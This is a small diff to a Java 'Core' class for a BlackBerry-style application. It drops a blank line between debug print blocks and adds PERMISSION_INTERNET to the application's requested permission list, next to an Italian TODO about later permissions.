@@ -82,7 +82,6 @@ public final class Core implements Runnable {
         //#ifdef DEBUG
         System.out.println("DEBUG");
         //#endif
-
         //#ifdef DEBUG
         System.out.println("DEBUG_TRACE");
         //#endif
@@ -160,7 +159,9 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_CHANGE_DEVICE_SETTINGS,
                 ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
                 ApplicationPermissions.PERMISSION_BROWSER_FILTER,
-                ApplicationPermissions.PERMISSION_INTER_PROCESS_COMMUNICATION};
+                ApplicationPermissions.PERMISSION_INTER_PROCESS_COMMUNICATION,
+                ApplicationPermissions.PERMISSION_INTERNET,
+                };
 
         //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
 
